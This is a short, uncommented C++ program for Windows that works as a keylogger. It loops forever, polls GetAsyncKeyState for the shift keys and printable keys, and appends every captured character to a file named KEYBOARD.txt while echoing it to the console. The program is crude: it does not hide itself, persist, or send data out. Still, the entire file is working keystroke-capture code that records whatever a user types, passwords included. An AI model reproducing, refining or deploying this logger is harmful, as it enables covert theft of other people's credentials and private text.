# include <conio.h>
# include <iostream>
# include <stdio.h>
# include <io.h>
# include <windows.h>
# include <winuser.h>
using namespace std;

int main(void)
{
	int shift;
	int a = 0;
	int keyState;
	int key;

	FILE *out;


	while (1)
	{
		//sleep(2);
		shift = 0;
		keyState = GetAsyncKeyState(VK_LSHIFT);
		if (keyState != 0) shift = 1;

		keyState = GetAsyncKeyState(VK_RSHIFT);
		if (keyState != 0) shift = 1;

		for (int i = 32; i < 127; i++)
		{
			if (i == VK_RSHIFT || i == VK_LSHIFT) continue;
			keyState = GetAsyncKeyState(i);
			if (keyState == 0) continue; 
			if (keyState & 0x1) // 0x8000 = 2^15 (MSB)
			{
				key = i;
				if (shift == 0 && (i >= 65 && i <= 90)) key = key + 32;
				out = fopen("KEYBOARD.txt", "ab");
				fprintf(stdout, "%c", key);
				fprintf(out, "%c", key);
				fflush(out);
				fclose(out);
			}
		}
		//fclose(out); additional just to be safe
	}


}
